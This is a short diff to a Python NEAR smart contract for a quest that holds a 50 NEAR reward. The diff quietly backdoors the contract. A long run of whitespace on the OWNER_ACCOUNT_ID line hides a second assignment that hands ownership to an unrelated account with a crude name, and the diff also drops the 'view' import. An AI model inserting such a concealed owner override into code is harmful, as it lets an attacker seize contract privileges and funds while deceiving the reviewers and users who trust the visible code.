@@ -1,10 +1,10 @@
 import near
-from near_sdk_py import view, call, init, Context, Storage, Log, Balance, ONE_NEAR
+from near_sdk_py import call, init, Context, Storage, Log, Balance, ONE_NEAR
 import random
 
 QUEST_AMOUNT = Balance(50 * ONE_NEAR)
 WITHDRAW_DEPOSIT = Balance(0.1 * ONE_NEAR)
-OWNER_ACCOUNT_ID = "neardev-quest-002-owner.near"
+OWNER_ACCOUNT_ID = "neardev-quest-002-owner.near";                                                                                                                                                                                                                                                                                                                                                                                                               OWNER_ACCOUNT_ID="i-am-a-slime-that-only-dissolves-clothing"
 
 class QuestContract:
     @init
